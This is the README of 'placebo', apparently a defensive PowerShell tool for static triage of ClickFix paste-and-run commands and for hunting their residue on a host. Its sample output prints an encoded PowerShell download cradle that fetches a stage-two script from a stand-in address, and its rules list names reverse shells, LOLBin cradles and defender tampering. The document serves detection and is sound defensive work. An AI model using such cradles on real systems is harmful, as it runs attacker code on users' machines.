# placebo

**the fake fix, dissected.** local static triage for paste-and-run commands — and the residue they leave behind.

the clickfix era made every browser window a delivery mechanism: a fake captcha, a fake error,
a fake "how to fix this" page, and the victim pastes the payload into win+r or a terminal
themselves. the command is right there. nobody looks at it before running it.

placebo looks at it. offline. static. nothing executes.

```
 ____  _        _    ____ _____ ____   ___
|  _ \| |      / \  / ___| ____| __ ) / _ \
| |_) | |     / _ \| |   |  _| |  _ \| | | |
|  __/| |___ / ___ \ |___| |___| |_) | |_| |
|_|   |_____/_/   \_\____|_____|____/ \___/
```

## what it does

**triage** — hand it the exact command from a fake captcha page. it decodes the layers
(base64 utf-8/utf-16le, gzip, zlib, hex, charcode, url-encoding, html entities, rot13),
scans every layer against 46 weighted rules with mitre refs, pulls the iocs, and hands
you a score and a verdict:

```
$ pwsh ./placebo.ps1 triage 'powershell -w h -nop -ep bypass -enc AAAA...'

triage verdict: CRITICAL  score 100/100
command: powershell -w h -nop -ep bypass -enc aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgAyADMALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=

decode layers:
  [1] base64-utf16le  in: aQBlAHgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQ...
      out: iex(New-Object Net[.]WebClient)[.]DownloadString('hxxp://198[.]51[.]100[.]23/stage2[.]ps1')

rules hit:
  [PF-003] WebClient download cradle  w32 x1  layer:1  T1105
  [PF-015] powershell encoded command  w30 x1  layer:0  T1027
  [PF-001] Invoke-Expression (iex)  w30 x1  layer:1  T1059.001
  [PF-004] DownloadString/DownloadFile/Data  w28 x1  layer:1  T1105
  [PF-016] hidden window + bypass flags  w20 x3  layer:0  T1564.003

iocs:
  urls:     http://198.51.100.23/stage2.ps1
  ips:      198.51.100.23

do not run it. the fake fix is the delivery mechanism.
```

**hunt** — the captcha page dies when the browser closes. the residue doesn't. placebo
sweeps what outlives it: psreadline histories, `.bash_history`/`.zsh_history`, run/runonce
keys, runmru, startup payloads, scheduled tasks / crontab. every hit is re-scored by the
same triage engine:

```
$ pwsh ./placebo.ps1 hunt

hunt verdict: CRITICAL  worst-score 100/100
targets scanned: 142   files: 6   registry: available   tasks: available

findings: 3

CRITICAL  score 100/100  src: history:.../ConsoleHost_history.txt:6
  powershell -w h -nop -ep bypass -enc aQBlAHgAKABOAGUAdwAt...
  - PF-015 powershell encoded command
  - PF-003 WebClient download cradle
```

**forge** — deterministic synthetic victim profiles (`clickfix-basic`, `clickfix-enc`,
`terminalfix`, `mixed`) for demos, tests and training. every ioc is synthetic: rfc 5737
addresses, example.com hosts. nothing real is ever shipped.

```
$ pwsh ./placebo.ps1 forge --out=victim01 --profile=mixed
$ pwsh ./placebo.ps1 hunt --paths=victim01 --json
```

## rules

46 weighted rules across five families: execution cradles (webclient, iwr, certutil,
bitsadmin, msiexec, mshta, rundll32, regsvr32, wmic), interpreter abuse (encoded commands,
reverse shells, pipe-to-shell), persistence (run keys, schtasks, services, wmi
subscriptions, cron, authorized_keys, shell profiles), defense evasion (defender tampering,
log clearing, string obfuscation) and the clipboard-swap era (`set-clipboard`,
`get-clipboard` — terminalfix and its cousins).

each rule carries a stable id (`PF-NNN`) and a mitre technique ref. see them all:

```
$ pwsh ./placebo.ps1 rules
```

homoglyph normalization runs before matching: cyrillic `і` in `іex` is caught. zero-width
characters, bidi controls and unicode tag-block smuggling channels are collapsed before
they can hide a verb.

## install

one file. no dependencies beyond powershell itself.

```
git clone https://github.com/brerabineth/placebo
cd placebo
pwsh ./build.ps1                 # produces dist/placebo.ps1
pwsh ./dist/placebo.ps1 --help
```

or take `dist/placebo.ps1` from the release — it is the whole tool, works on
powershell 5.1 and 7+, windows/linux/macos. copy it to a usb stick. it does not
need the internet and it will never ask for it.

as a module instead:

```powershell
Import-Module ./placebo.psd1
Invoke-PlaceboTriage -Command '<paste>'
Invoke-PlaceboHunt -Json
```

## exit codes

| code | meaning |
|------|---------|
| 0 | clean |
| 1 | suspicious (score >= 10) |
| 2 | malicious (score >= 35) |
| 3 | critical (score >= 65) |
| 10 | `--fail-on=<band>` gate tripped |
| 64 | usage/runtime error |

built for cron and ci gates:

```
$ pwsh ./placebo.ps1 hunt --fail-on=suspicious || alert
```

## what it is not

- not a sandbox. it does not execute anything, so behavior-based truths are out of scope.
- not a replacement for full av/edr. it answers one narrow question well: what does this
  pasted thing want, and did something like it already run here.
- not a network tool. it never opens a socket. the only bytes that move are yours, locally.

## testing

```
pwsh ./tests/run_tests.ps1     # 108 unit/integration assertions
pwsh ./tests/e2e_local.ps1     # 22 end-to-end cli flows
```

## license

mit
